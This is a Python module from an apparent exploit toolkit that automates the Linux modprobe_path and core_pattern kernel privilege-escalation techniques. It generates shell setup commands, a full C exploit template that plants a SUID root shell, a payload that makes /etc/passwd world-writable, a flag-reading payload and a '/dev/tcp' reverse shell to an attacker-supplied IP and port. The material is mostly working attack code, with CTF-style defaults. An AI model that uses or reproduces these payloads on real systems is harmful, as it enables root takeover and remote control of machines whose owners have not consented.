"""
modprobe_path kernel exploitation technique.

Exploits the kernel's modprobe_path mechanism to gain root code execution.

When a file with an unknown magic number is executed, the kernel invokes
the modprobe helper specified in /proc/sys/kernel/modprobe (or the
modprobe_path kernel variable). By overwriting modprobe_path with a
path to our script and triggering execution of an unknown file type,
we get root code execution.

Technique overview:
1. Find modprobe_path address (usually in .data section)
2. Use arbitrary write primitive to overwrite modprobe_path
3. Create a shell script at the new path
4. Trigger modprobe by executing a file with invalid magic
5. Our script runs as root

Advantages:
- Works with any arbitrary write primitive (even single-shot)
- No need for full ROP chain
- Works with SMEP/SMAP enabled
- Simple and reliable

Requirements:
- Arbitrary write primitive (or enough ROP to do writes)
- Know location of modprobe_path
- Can execute files (or trigger file execution)
"""

import os
import subprocess
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from supwngo.kernel.symbols import KernelSymbols
from supwngo.utils.helpers import p64
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


# Default modprobe_path offset varies by kernel
# These are example offsets - must be adjusted per target
DEFAULT_MODPROBE_PATH_OFFSETS = {
    "5.4.0": 0x1a8fe00,
    "5.11.0": 0x1b41920,
    "5.15.0": 0x1c3c540,
    "generic": 0x1a8fe00,
}


@dataclass
class ModprobePayload:
    """Complete modprobe_path exploit payload."""
    modprobe_path_addr: int = 0
    new_path: str = "/tmp/x"
    trigger_file: str = "/tmp/dummy"
    script_content: str = ""
    setup_commands: List[str] = field(default_factory=list)


class ModprobeExploit:
    """
    modprobe_path exploitation helper.

    Uses kernel's modprobe mechanism to execute arbitrary code as root.

    Example usage:
        symbols = KernelSymbols.from_leak("commit_creds", leaked_addr)
        modprobe = ModprobeExploit(symbols)

        # Get payload for overwrite
        payload = modprobe.generate_payload()

        # Generate C template
        code = modprobe.generate_exploit_template()
    """

    # Default paths
    DEFAULT_SCRIPT_PATH = "/tmp/x"
    DEFAULT_TRIGGER_PATH = "/tmp/dummy"
    DEFAULT_FLAG_PATH = "/tmp/pwned"

    def __init__(
        self,
        symbols: KernelSymbols,
        modprobe_offset: Optional[int] = None,
    ):
        """
        Initialize modprobe exploit handler.

        Args:
            symbols: KernelSymbols instance
            modprobe_offset: Offset of modprobe_path from kernel base
                           (auto-detected if None)
        """
        self.symbols = symbols
        self.kernel_base = symbols.kernel_base

        if modprobe_offset is not None:
            self.modprobe_path_addr = self.kernel_base + modprobe_offset
        else:
            self.modprobe_path_addr = self._find_modprobe_path()

    def _find_modprobe_path(self) -> int:
        """
        Find modprobe_path address.

        Returns:
            Address of modprobe_path string in kernel
        """
        # Try symbol lookup first
        try:
            return self.symbols.resolve("modprobe_path")
        except KeyError:
            pass

        # Try common offset
        offset = DEFAULT_MODPROBE_PATH_OFFSETS.get("generic", 0)
        if offset:
            return self.kernel_base + offset

        logger.warning("Could not find modprobe_path - using placeholder")
        return 0

    def get_current_modprobe(self) -> str:
        """Get current modprobe_path value from /proc."""
        try:
            with open("/proc/sys/kernel/modprobe", "r") as f:
                return f.read().strip()
        except Exception:
            return "/sbin/modprobe"

    def generate_payload(
        self,
        script_path: str = "/tmp/x",
        command: str = "chmod 777 /etc/passwd",
    ) -> ModprobePayload:
        """
        Generate modprobe_path exploit payload.

        Args:
            script_path: Path where exploit script will be placed
            command: Command to execute as root

        Returns:
            ModprobePayload with all components
        """
        payload = ModprobePayload()
        payload.modprobe_path_addr = self.modprobe_path_addr
        payload.new_path = script_path
        payload.trigger_file = self.DEFAULT_TRIGGER_PATH

        # Generate shell script
        payload.script_content = f"""#!/bin/sh
{command}
touch {self.DEFAULT_FLAG_PATH}
"""

        # Setup commands for exploit
        payload.setup_commands = [
            f"echo '#!/bin/sh' > {script_path}",
            f"echo '{command}' >> {script_path}",
            f"chmod +x {script_path}",
            f"echo -ne '\\xff\\xff\\xff\\xff' > {self.DEFAULT_TRIGGER_PATH}",
            f"chmod +x {self.DEFAULT_TRIGGER_PATH}",
        ]

        return payload

    def generate_root_shell_payload(
        self,
        script_path: str = "/tmp/x",
    ) -> ModprobePayload:
        """
        Generate payload that creates a root shell.

        Creates a SUID copy of /bin/sh.

        Args:
            script_path: Path for exploit script

        Returns:
            ModprobePayload for root shell
        """
        command = "cp /bin/sh /tmp/rootsh && chmod 4755 /tmp/rootsh"
        return self.generate_payload(script_path, command)

    def generate_flag_reader_payload(
        self,
        flag_path: str = "/root/flag.txt",
        script_path: str = "/tmp/x",
    ) -> ModprobePayload:
        """
        Generate payload that reads a flag file.

        Args:
            flag_path: Path to flag file
            script_path: Path for exploit script

        Returns:
            ModprobePayload to read flag
        """
        command = f"cat {flag_path} > /tmp/flag_out"
        return self.generate_payload(script_path, command)

    def generate_reverse_shell_payload(
        self,
        ip: str,
        port: int,
        script_path: str = "/tmp/x",
    ) -> ModprobePayload:
        """
        Generate payload for reverse shell.

        Args:
            ip: Attacker IP address
            port: Attacker port
            script_path: Path for exploit script

        Returns:
            ModprobePayload for reverse shell
        """
        command = f"/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        return self.generate_payload(script_path, command)

    def get_write_bytes(self, new_path: str = "/tmp/x") -> bytes:
        """
        Get bytes to write to modprobe_path.

        Args:
            new_path: New path for modprobe

        Returns:
            Null-terminated path string as bytes
        """
        return new_path.encode() + b"\x00"

    def generate_rop_write_chain(
        self,
        new_path: str = "/tmp/x",
        write_gadgets: Optional[Dict[str, int]] = None,
    ) -> bytes:
        """
        Generate ROP chain to overwrite modprobe_path.

        Args:
            new_path: New path to write
            write_gadgets: Dict of gadget name -> address

        Returns:
            ROP chain bytes
        """
        if not write_gadgets:
            logger.warning("No gadgets provided for ROP chain")
            return b""

        chain = []

        # Need gadgets for:
        # 1. pop rdi; ret (destination address)
        # 2. pop rsi; ret (source - pointer to string)
        # 3. mov [rdi], rsi; ret (or equivalent write primitive)
        # Or alternatively string copy gadgets

        path_bytes = new_path.encode()

        # Simple byte-by-byte write using mov [rax], bl pattern
        # This is highly gadget-dependent

        logger.info(f"ROP chain would write '{new_path}' to 0x{self.modprobe_path_addr:x}")
        return b"".join(chain)

    def check_feasibility(self) -> Tuple[bool, str]:
        """
        Check if modprobe_path technique is feasible.

        Returns:
            Tuple of (feasible, reason)
        """
        if not self.modprobe_path_addr:
            return False, "modprobe_path address not found"

        # Check if we can write to /tmp
        try:
            with tempfile.NamedTemporaryFile(dir="/tmp", delete=True) as f:
                f.write(b"test")
        except Exception as e:
            return False, f"Cannot write to /tmp: {e}"

        return True, f"modprobe_path at 0x{self.modprobe_path_addr:x}"

    def generate_exploit_template(
        self,
        device_path: str = "/dev/vuln",
        script_path: str = "/tmp/x",
    ) -> str:
        """
        Generate complete C exploit template.

        Args:
            device_path: Path to vulnerable device
            script_path: Path for exploit script

        Returns:
            C source code string
        """
        return f'''/*
 * modprobe_path Kernel Exploit Template
 * Generated by supwngo
 *
 * Technique: Overwrite modprobe_path to execute arbitrary code as root
 *
 * Requirements:
 * - Arbitrary write primitive
 * - Known modprobe_path address
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/stat.h>

#define DEVICE_PATH "{device_path}"

/* Kernel addresses */
unsigned long kbase = 0x{self.kernel_base:x};
unsigned long modprobe_path = 0x{self.modprobe_path_addr:x};

/* Exploit paths */
#define SCRIPT_PATH "{script_path}"
#define TRIGGER_PATH "/tmp/dummy"
#define FLAG_PATH "/tmp/pwned"

void setup_payload() {{
    printf("[*] Setting up payload files...\\n");

    /* Create exploit script */
    FILE *fp = fopen(SCRIPT_PATH, "w");
    if (!fp) {{
        perror("fopen script");
        exit(1);
    }}
    fprintf(fp, "#!/bin/sh\\n");
    fprintf(fp, "cp /bin/sh /tmp/rootsh\\n");
    fprintf(fp, "chmod 4755 /tmp/rootsh\\n");
    fclose(fp);
    chmod(SCRIPT_PATH, 0755);
    printf("[+] Created %s\\n", SCRIPT_PATH);

    /* Create trigger file with invalid magic */
    fp = fopen(TRIGGER_PATH, "wb");
    if (!fp) {{
        perror("fopen trigger");
        exit(1);
    }}
    /* Invalid ELF magic - triggers modprobe */
    fwrite("\\xff\\xff\\xff\\xff", 1, 4, fp);
    fclose(fp);
    chmod(TRIGGER_PATH, 0755);
    printf("[+] Created trigger file\\n");
}}

void trigger_modprobe() {{
    printf("[*] Triggering modprobe...\\n");

    /* Execute file with invalid magic
     * Kernel will try to load module via modprobe_path */
    system(TRIGGER_PATH);

    /* Wait a moment */
    usleep(100000);

    /* Check for success */
    if (access(FLAG_PATH, F_OK) == 0) {{
        printf("[+] Payload executed!\\n");
    }}
}}

/*
 * Arbitrary write primitive wrapper
 * TODO: Implement based on vulnerability
 */
void arb_write(unsigned long addr, void *data, size_t len) {{
    printf("[*] Writing %zu bytes to 0x%lx\\n", len, addr);

    /*
     * Example implementations:
     *
     * 1. Via vulnerable ioctl:
     *    struct write_req {{ unsigned long addr; char data[256]; }};
     *    struct write_req req = {{ .addr = addr }};
     *    memcpy(req.data, data, len);
     *    ioctl(fd, VULN_WRITE, &req);
     *
     * 2. Via kernel ROP:
     *    Build ROP chain that copies data to addr
     *
     * 3. Via use-after-free:
     *    Free object, reallocate with controlled data
     *    that overlaps with modprobe_path
     */
}}

int main(int argc, char **argv) {{
    int fd;

    printf("[*] modprobe_path exploit\\n");
    printf("[*] Target: 0x%lx\\n", modprobe_path);

    /* Setup payload files */
    setup_payload();

    /* Open vulnerable device */
    fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {{
        perror("open device");
        return 1;
    }}
    printf("[+] Opened device\\n");

    /*
     * Overwrite modprobe_path
     * The path must be null-terminated and fit in KMOD_PATH_LEN (256)
     */
    char new_path[] = SCRIPT_PATH;
    arb_write(modprobe_path, new_path, strlen(new_path) + 1);
    printf("[+] Overwrote modprobe_path\\n");

    /* Trigger modprobe execution */
    trigger_modprobe();

    /* Check for root shell */
    if (access("/tmp/rootsh", F_OK) == 0) {{
        printf("[+] Root shell created: /tmp/rootsh\\n");
        system("/tmp/rootsh");
    }} else {{
        printf("[-] Exploit may have failed\\n");
    }}

    close(fd);
    return 0;
}}
'''

    def generate_setup_script(
        self,
        script_path: str = "/tmp/x",
        command: str = "cp /bin/sh /tmp/rootsh && chmod 4755 /tmp/rootsh",
    ) -> str:
        """
        Generate shell script to set up exploit environment.

        Args:
            script_path: Path for exploit script
            command: Command to run as root

        Returns:
            Shell script as string
        """
        return f'''#!/bin/bash
# modprobe_path Exploit Setup
# Generated by supwngo

echo "[*] Setting up modprobe_path exploit"

# Create exploit script
cat > {script_path} << 'EOF'
#!/bin/sh
{command}
EOF
chmod +x {script_path}
echo "[+] Created {script_path}"

# Create trigger file with invalid magic
echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy
chmod +x /tmp/dummy
echo "[+] Created /tmp/dummy trigger"

echo "[*] Ready! Use your write primitive to set modprobe_path = '{script_path}'"
echo "[*] Then run: /tmp/dummy"
'''

    def summary(self) -> str:
        """Get technique summary."""
        feasible, reason = self.check_feasibility()
        current = self.get_current_modprobe()

        return f"""
modprobe_path Exploitation
==========================
Feasible: {feasible}
Reason: {reason}

Kernel base: 0x{self.kernel_base:x}
modprobe_path: 0x{self.modprobe_path_addr:x}
Current value: {current}

Usage:
  modprobe = ModprobeExploit(symbols)
  payload = modprobe.generate_payload()

  # Write new path to modprobe_path
  arb_write(payload.modprobe_path_addr, b"{self.DEFAULT_SCRIPT_PATH}\\x00")

  # Trigger
  system("/tmp/dummy")

  # Root shell at /tmp/rootsh

Advantages:
  - Works with SMEP/SMAP enabled
  - Only needs arbitrary write primitive
  - Simple and reliable
"""


class CorePatternExploit:
    """
    core_pattern exploitation - similar technique using /proc/sys/kernel/core_pattern.

    When a program crashes, the kernel can pipe the core dump to a helper program
    specified in core_pattern. By overwriting core_pattern, we can execute
    arbitrary code as root when a crash occurs.
    """

    # core_pattern typically at different offset than modprobe_path
    DEFAULT_CORE_PATTERN_OFFSET = 0x1a90e40

    def __init__(
        self,
        symbols: KernelSymbols,
        core_pattern_offset: Optional[int] = None,
    ):
        """
        Initialize core_pattern exploit handler.

        Args:
            symbols: KernelSymbols instance
            core_pattern_offset: Offset of core_pattern from kernel base
        """
        self.symbols = symbols
        self.kernel_base = symbols.kernel_base

        if core_pattern_offset is not None:
            self.core_pattern_addr = self.kernel_base + core_pattern_offset
        else:
            self.core_pattern_addr = self._find_core_pattern()

    def _find_core_pattern(self) -> int:
        """Find core_pattern address."""
        try:
            return self.symbols.resolve("core_pattern")
        except KeyError:
            return self.kernel_base + self.DEFAULT_CORE_PATTERN_OFFSET

    def get_current_core_pattern(self) -> str:
        """Get current core_pattern value."""
        try:
            with open("/proc/sys/kernel/core_pattern", "r") as f:
                return f.read().strip()
        except Exception:
            return "core"

    def generate_payload(
        self,
        handler_path: str = "/tmp/core_handler",
        command: str = "chmod 777 /etc/passwd",
    ) -> str:
        """
        Generate core_pattern overwrite payload.

        Note: core_pattern starts with | to pipe to handler.

        Args:
            handler_path: Path to handler script
            command: Command to execute

        Returns:
            String to write to core_pattern
        """
        # Pipe format: |/path/to/handler %s %c %p ...
        # %s = signal, %c = core limit, %p = pid
        return f"|{handler_path}"


__all__ = [
    "ModprobeExploit",
    "ModprobePayload",
    "CorePatternExploit",
]
